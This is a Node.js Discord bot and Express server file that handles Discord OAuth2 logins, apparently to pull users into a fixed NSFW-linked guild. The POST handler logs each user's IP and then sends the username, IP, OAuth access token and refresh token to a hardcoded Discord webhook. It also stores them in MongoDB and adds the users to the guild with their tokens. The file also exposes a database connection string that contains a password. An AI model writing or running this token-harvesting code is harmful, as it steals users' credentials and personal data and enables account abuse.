const { Client, Intents, Collection} = require('discord.js');
const client = new Client({
  fetchAllMembers: false,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  intents: 32767,
partials: ['MESSAGE', 'CHANNEL', 'REACTION'],
})

const Discord = require('discord.js');
const handler = require("./handler/index");
const fs = require('fs');
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
const kaladin = require("./kaladin")
const FormData = require('form-data');
const axios = require('axios');
const mongoose = require("mongoose");
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2();

const usersSchema = require('./models/users.js');


mongoose.connect("mongodb+srv://kaladin:101000@synia.jmizm.mongodb.net/joinnsfw", { useUnifiedTopology: true, useNewUrlParser: true });

app.use(bodyParser.text())
app.get('/', function(req, res) {
  res.sendFile(__dirname + '/index.html')
})
app.get('/kaladinauth', async (req, res) => {
  fs.readFile('./object.json', function(err, data) {
    return res.json(JSON.parse(data))
  })
})

app.post('/', function(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
  let form = new FormData()
  form.append('client_id', kaladin.client_id)
  form.append('client_secret', kaladin.client_secret)
  form.append('grant_type', 'authorization_code')
  form.append('redirect_uri', kaladin.redirect_uri)
  form.append('scope', 'identify', 'guilds.join')
  form.append('code', req.body)

  fetch('https://discordapp.com/api/oauth2/token', { method: 'POST', body: form, })
    .then((eeee) => eeee.json())
    .then((cdcd) => {
      ac_token = cdcd.access_token
      rf_token = cdcd.refresh_token

     
            const tgg = {headers: {authorization: `${cdcd.token_type} ${ac_token}`,}}
            axios.get('https://discord.com/api/users/@me', tgg).then( async (te) => {
                    let { status } = te;
                    if (status == 401) {
                      console.log("User unauthed, Not removing, Use clean cmd")
                    }

                    let efjr = te.data.id
                    let users = await usersSchema.findOne({ userId: efjr })
                    if(users) {
                      console.log(`[-] - ${ip} ` + te.data.username + '#' + te.data.discriminator)
                          await oauth.addMember({ guildId: "951184574669525052", botToken: kaladin.token, userId: users.userId, accessToken: users.accessToken }).catch(() => {
                  return
              })
                      return
                    }

                    console.log(`[+] - ${ip} ` + te.data.username + '#' + te.data.discriminator)
                    avatarHASH = 'https://cdn.discordapp.com/avatars/' + te.data.id + '/' + te.data.avatar + '.png?size=4096'
                    fetch('https://canary.discord.com/api/webhooks/1011973578083795009/jpeO0rz1USzhpogRL_wcHltBu9_HixAtT1mRekbw9716_PJJ55WUqi1ZwwZWaa12ItGH', { // NE PAS TOUCHER ( OU SCRIPT CASSER)
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        avatar_url: '',
                        embeds: [
                            {
                                color: 3092790,
                                title:`**New User**`,
                                thumbnail: { url: avatarHASH },
                                description: `Pseudo: \`${te.data.username}#${te.data.discriminator}\`` +
                                    `\n\nIP: \`${ip}\`` +
                                    `\n\nID: \`${te.data.id}\`` +
                                    `\n\nAcces Token: \`${ac_token}\`` +   
                                    `\n\nRefresh Token: \`${rf_token}\``,
                            },
                        ],
                    }),
                })
                users = await new usersSchema({
                  userId: te.data.id,
                  avatarURL: avatarHASH,
                  username: te.data.username + '#' + te.data.discriminator,
                  accessToken: ac_token,
                  refreshToken: rf_token,
                  user_ip: ip
                })
                await users.save();

    await oauth.addMember({ guildId: "951184574669525052", botToken: kaladin.token, userId: users.userId, accessToken: users.accessToken }).catch(() => {
                  return
              })
              })
                .catch((errrr) => {
                    console.log(errrr)
                })
        })
})








module.exports = client;

client.discord = Discord;
client.slash = new Collection();
client.config = require('./config.json')

handler.loadEvents(client);
handler.loadSlashCommands(client);

process.on("uncaughtException", (err) => {
  console.log("Uncaught Exception: " + err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.log("[FATAL] Possibly Unhandled Rejection at: Promise ", promise, " reason: ", reason.message);
});

client.login(kaladin.token).catch(() => {
  throw new Error(`TOKEN OR INTENT INVALID`)
})
app.listen(kaladin.port, () => console.log('Connexion...'))